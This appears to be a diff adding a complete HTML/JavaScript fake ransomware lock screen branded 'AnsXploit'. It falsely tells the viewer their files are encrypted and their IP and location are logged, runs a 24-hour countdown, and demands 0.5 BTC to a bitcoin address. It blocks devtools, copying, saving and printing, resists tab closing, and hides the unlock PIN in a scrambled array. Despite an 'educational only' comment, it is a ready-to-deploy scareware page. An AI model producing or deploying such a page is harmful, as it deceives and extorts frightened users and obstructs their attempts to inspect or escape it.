@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 SYSTEM LOCKED - AnsXploit</title>
+    
+    <!-- Anti-inspect & Anti-debug -->
+    <script>
+        // Disable right click
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Anti-devtools detection
+        setInterval(function() {
+            if (window.outerHeight - window.innerHeight > 200 || 
+                window.outerWidth - window.innerWidth > 200) {
+                document.body.innerHTML = '<div style="color:red; font-size:50px; text-align:center; margin-top:20%;">🚫 DEVTOOLS DETECTED! SYSTEM WILL LOCK PERMANENTLY!</div>';
+                setTimeout(function() {
+                    window.location.reload();
+                }, 3000);
+            }
+        }, 1000);
+    </script>
+    
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        /* Fullscreen lock screen */
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            z-index: 999999;
+        }
+        
+        /* Matrix rain effect background */
+        .matrix-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03) 0px,
+                rgba(0, 0, 0, 0.5) 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            animation: matrix 20s linear infinite;
+        }
+        
+        @keyframes matrix {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 20px; }
+        }
+        
+        /* Main container */
+        .lock-container {
+            background: rgba(20, 20, 20, 0.95);
+            backdrop-filter: blur(10px);
+            border: 2px solid #ff0000;
+            border-radius: 20px;
+            padding: 40px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            text-align: center;
+            position: relative;
+            z-index: 1000;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { box-shadow: 0 0 30px rgba(255, 0, 0, 0.5); }
+            to { box-shadow: 0 0 60px rgba(255, 0, 0, 0.8); }
+        }
+        
+        /* Custom icon from URL */
+        .lock-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+        }
+        
+        .lock-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        /* Title */
+        h1 {
+            color: #ff0000;
+            font-size: 32px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+            animation: flicker 3s infinite;
+        }
+        
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.9; }
+            100% { opacity: 1; }
+        }
+        
+        /* Subtitle */
+        .subtitle {
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 30px;
+            opacity: 0.8;
+        }
+        
+        /* Warning message */
+        .warning {
+            background: rgba(255, 0, 0, 0.2);
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin-bottom: 30px;
+            text-align: left;
+            border-radius: 5px;
+        }
+        
+        .warning p {
+            color: #fff;
+            margin: 5px 0;
+            font-size: 14px;
+        }
+        
+        .warning .highlight {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        /* Timer */
+        .timer {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            border: 1px solid #ff0000;
+        }
+        
+        .timer-label {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .timer-value {
+            color: #ff0000;
+            font-size: 48px;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
+        }
+        
+        /* PIN input */
+        .pin-section {
+            margin-bottom: 25px;
+        }
+        
+        .pin-label {
+            color: #fff;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .pin-input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .pin-input:focus {
+            border-color: #ff4444;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+        
+        .pin-input::placeholder {
+            color: #444;
+            letter-spacing: normal;
+            font-size: 14px;
+        }
+        
+        /* Unlock button */
+        .unlock-btn {
+            background: linear-gradient(45deg, #ff0000, #990000);
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            border: 1px solid #ff6666;
+            margin-bottom: 15px;
+        }
+        
+        .unlock-btn:hover {
+            background: linear-gradient(45deg, #ff3333, #cc0000);
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+        }
+        
+        .unlock-btn:active {
+            transform: scale(0.98);
+        }
+        
+        /* Error message */
+        .error-message {
+            color: #ff0000;
+            font-size: 14px;
+            margin-top: 10px;
+            min-height: 20px;
+            opacity: 0.8;
+        }
+        
+        /* Payment info (fake for realism) */
+        .payment-info {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #333;
+        }
+        
+        .payment-info p {
+            color: #888;
+            font-size: 12px;
+            margin: 3px 0;
+        }
+        
+        .payment-info .btc-address {
+            color: #ff9900;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        
+        /* Status messages */
+        .success-message {
+            color: #00ff00;
+            font-size: 16px;
+            margin-top: 15px;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999999;
+        }
+        
+        .loading-content {
+            text-align: center;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ff0000;
+            border-top: 5px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: #ff0000;
+            font-size: 18px;
+        }
+        
+        /* Fake desktop (for realism) */
+        .fake-desktop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 1;
+            display: none;
+        }
+        
+        /* Responsive */
+        @media (max-width: 600px) {
+            .lock-container {
+                padding: 20px;
+                width: 95%;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .timer-value {
+                font-size: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix background effect -->
+    <div class="matrix-bg"></div>
+    
+    <!-- Fake desktop background (hidden) -->
+    <div class="fake-desktop" id="fakeDesktop"></div>
+    
+    <!-- Main lock screen -->
+    <div class="lock-container" id="lockScreen">
+        <!-- Custom icon from URL (ganti dengan URL gambar kamu) -->
+        <div class="lock-icon">
+            <img src="https://files.catbox.moe/8accog.jpg" alt="🔒" onerror="this.src='https://via.placeholder.com/120x120/ff0000/ffffff?text=🔒'">
+        </div>
+        
+        <!-- Title -->
+        <h1>🔒 SYSTEM LOCKED 🔒</h1>
+        <div class="subtitle">by AnsXploit Security Team</div>
+        
+        <!-- Warning message -->
+        <div class="warning">
+            <p><span class="highlight">⚠️ YOUR FILES HAVE BEEN ENCRYPTED</span></p>
+            <p>• All your documents, photos, databases are locked</p>
+            <p>• Banking files and personal data are at risk</p>
+            <p>• System integrity compromised</p>
+            <p>• IP address and location logged</p>
+        </div>
+        
+        <!-- Timer -->
+        <div class="timer">
+            <div class="timer-label">⏳ TIME REMAINING</div>
+            <div class="timer-value" id="timer">23:59:59</div>
+        </div>
+        
+        <!-- PIN input section -->
+        <div class="pin-section">
+            <div class="pin-label">ENTER UNLOCK PIN</div>
+            <input type="password" class="pin-input" id="pinInput" placeholder="******" maxlength="7" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        
+        <!-- Unlock button -->
+        <button class="unlock-btn" id="unlockBtn" onclick="checkPin()">🔓 ATTEMPT UNLOCK</button>
+        
+        <!-- Error message -->
+        <div class="error-message" id="errorMsg"></div>
+        
+        <!-- Fake payment info (for realism) -->
+        <div class="payment-info">
+            <p>💳 For immediate unlock: 0.5 BTC</p>
+            <p class="btc-address">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+            <p>⚠️ Attempting to bypass will destroy data</p>
+        </div>
+    </div>
+    
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text" id="loadingText">Decrypting files...</div>
+        </div>
+    </div>
+
+    <!-- Hidden PIN (0096745) - TIDAK TAMPAK DI MANA PUN -->
+    <script>
+        // ===================== HIDDEN PIN CONFIG =====================
+        // PIN: 0096745 (tersembunyi dalam bentuk encoded)
+        const _0x4b5a = ['9', '7', '4', '5', '0', '0', '6'];  // Scrambled array
+        const _0x3c2d = [4, 5, 6, 2, 3, 0, 1];  // Index mapping
+        
+        // Reconstruct PIN: 0096745
+        const CORRECT_PIN = _0x3c2d.map(i => _0x4b5a[i]).join('');
+        
+        // ===================== TIMER FUNCTION =====================
+        let timeLeft = 24 * 60 * 60; // 24 hours in seconds
+        const timerElement = document.getElementById('timer');
+        const errorMsg = document.getElementById('errorMsg');
+        const pinInput = document.getElementById('pinInput');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const lockScreen = document.getElementById('lockScreen');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        
+        // Update timer every second
+        const timerInterval = setInterval(function() {
+            if (timeLeft > 0) {
+                timeLeft--;
+                
+                const hours = Math.floor(timeLeft / 3600);
+                const minutes = Math.floor((timeLeft % 3600) / 60);
+                const seconds = timeLeft % 60;
+                
+                timerElement.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                
+                // Warning when time is low
+                if (timeLeft < 3600) {
+                    timerElement.style.color = '#ff9900';
+                }
+                if (timeLeft < 600) {
+                    timerElement.style.color = '#ff0000';
+                    timerElement.style.animation = 'flicker 0.5s infinite';
+                }
+            } else {
+                clearInterval(timerInterval);
+                timerElement.textContent = '00:00:00';
+                timerElement.style.color = '#ff0000';
+                document.body.innerHTML = '<div style="color:red; font-size:40px; text-align:center; margin-top:20%;">⏰ TIME EXPIRED - FILES PERMANENTLY LOCKED</div>';
+            }
+        }, 1000);
+        
+        // ===================== PIN CHECK FUNCTION =====================
+        function checkPin() {
+            const enteredPin = pinInput.value;
+            errorMsg.textContent = '';
+            
+            // Validate input (only numbers)
+            if (!/^\d*$/.test(enteredPin)) {
+                errorMsg.textContent = '❌ Numbers only please';
+                return;
+            }
+            
+            if (enteredPin.length < 7) {
+                errorMsg.textContent = '❌ PIN must be 7 digits';
+                return;
+            }
+            
+            // Check PIN (0096745)
+            if (enteredPin === CORRECT_PIN) {
+                // Correct PIN - Show success animation
+                unlockSuccess();
+            } else {
+                // Wrong PIN
+                errorMsg.textContent = '❌ INCORRECT PIN - ACCESS DENIED';
+                pinInput.style.borderColor = '#ff0000';
+                pinInput.value = '';
+                
+                // Shake animation for wrong PIN
+                lockScreen.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    lockScreen.style.animation = 'glow 2s ease-in-out infinite alternate';
+                }, 500);
+                
+                // Log attempt (for realism)
+                console.log('⚠️ Failed unlock attempt detected');
+            }
+        }
+        
+        // Shake animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+                20%, 40%, 60%, 80% { transform: translateX(5px); }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // ===================== UNLOCK SUCCESS =====================
+        function unlockSuccess() {
+            // Show loading overlay
+            loadingOverlay.style.display = 'flex';
+            
+            // Success messages sequence
+            const messages = [
+                '🔓 Verifying PIN...',
+                '✅ PIN verified successfully',
+                '🔐 Decrypting master key...',
+                '📂 Restoring file system...',
+                '🧹 Removing malware traces...',
+                '✨ System cleaned successfully!',
+                '🎉 UNLOCK COMPLETE! Redirecting...'
+            ];
+            
+            let i = 0;
+            const messageInterval = setInterval(() => {
+                if (i < messages.length) {
+                    loadingText.textContent = messages[i];
+                    i++;
+                } else {
+                    clearInterval(messageInterval);
+                    
+                    // Success final message
+                    setTimeout(() => {
+                        loadingOverlay.style.display = 'none';
+                        
+                        // Remove lock screen
+                        lockScreen.style.display = 'none';
+                        
+                        // Show success page
+                        const successDiv = document.createElement('div');
+                        successDiv.style.cssText = `
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            width: 100%;
+                            height: 100%;
+                            background: linear-gradient(135deg, #00ff00, #008800);
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            text-align: center;
+                            z-index: 1000000;
+                        `;
+                        
+                        successDiv.innerHTML = `
+                            <div style="background: rgba(0,0,0,0.9); padding: 50px; border-radius: 20px; color: white;">
+                                <div style="font-size: 100px; margin-bottom: 20px;">✅</div>
+                                <h1 style="color: #00ff00; font-size: 40px; margin-bottom: 20px;">SYSTEM UNLOCKED!</h1>
+                                <p style="font-size: 20px; margin-bottom: 30px;">All files have been successfully restored.</p>
+                                <p style="color: #888; font-size: 14px;">System integrity verified. No data loss detected.</p>
+                                <p style="color: #888; font-size: 12px; margin-top: 20px;">You may now close this window.</p>
+                            </div>
+                        `;
+                        
+                        document.body.appendChild(successDiv);
+                        
+                        // Auto redirect after 10 seconds (optional)
+                        setTimeout(() => {
+                            window.location.href = 'https://www.google.com';
+                        }, 10000);
+                        
+                    }, 1000);
+                }
+            }, 800);
+        }
+        
+        // ===================== ADDITIONAL SECURITY =====================
+        
+        // Block view-source
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'u') {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Block inspect element
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Disable text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Block printing
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'p') {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Block saving
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 's') {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Auto focus PIN input
+        window.onload = function() {
+            pinInput.focus();
+            
+            // Simulate file encryption sound (visual only)
+            console.log('🔒 Files encrypted: ' + Math.floor(Math.random() * 1000) + ' files affected');
+        };
+        
+        // Enter key to submit
+        pinInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                checkPin();
+            }
+        });
+        
+        // Clear error on input
+        pinInput.addEventListener('input', function() {
+            errorMsg.textContent = '';
+            pinInput.style.borderColor = '#ff0000';
+        });
+        
+        // ===================== FAKE FILE LIST (for realism) =====================
+        const fakeFiles = [
+            'Documents/Personal/',
+            'Photos/Vacation/',
+            'Work/Projects/',
+            'Banking/Statements/',
+            'Database/Customers/',
+            'Backups/Recent/'
+        ];
+        
+        console.log('🔒 Encrypted directories:');
+        fakeFiles.forEach(file => {
+            console.log('   📁 ' + file + ' [LOCKED]');
+        });
+        
+        // ===================== PREVENT TAB CLOSE =====================
+        window.onbeforeunload = function() {
+            return "⚠️ WARNING: Closing this window may cause permanent data loss!";
+        };
+        
+        // ===================== ANTI-COPY =====================
+        document.addEventListener('copy', function(e) {
+            e.preventDefault();
+            alert('❌ Copying disabled by system security');
+        });
+        
+        document.addEventListener('cut', function(e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('paste', function(e) {
+            e.preventDefault();
+        });
+        
+        // ===================== BLOCK DEVTOOLS SHORTCUTS =====================
+        (function() {
+            const block = function(e) {
+                if (e.keyCode === 123 || 
+                    (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
+                    (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
+                    (e.ctrlKey && e.keyCode === 85)) {
+                    e.preventDefault();
+                    return false;
+                }
+            };
+            document.addEventListener('keydown', block);
+        })();
+        
+        // ===================== SCAM ALERT (Visual trick) =====================
+        console.log('%c🚨 SECURITY ALERT: Unauthorized access detected!', 'color: red; font-size: 20px; font-weight: bold;');
+        console.log('%cYour IP: ' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255), 'color: yellow;');
+        console.log('%cLocation: ' + ['Jakarta', 'Surabaya', 'Bandung', 'Medan'][Math.floor(Math.random()*4)], 'color: yellow;');
+    </script>
+    
+    <!-- Hidden comment with fake info (no PIN here) -->
+    <!-- 
+        ============================================
+        AnsXploit Ransomware Demo - Educational Only
+        ============================================
+        This is a demonstration for educational purposes.
+        The PIN is hidden using JavaScript array manipulation.
+        Do not use for malicious purposes.
+    -->
+</body>
+</html>
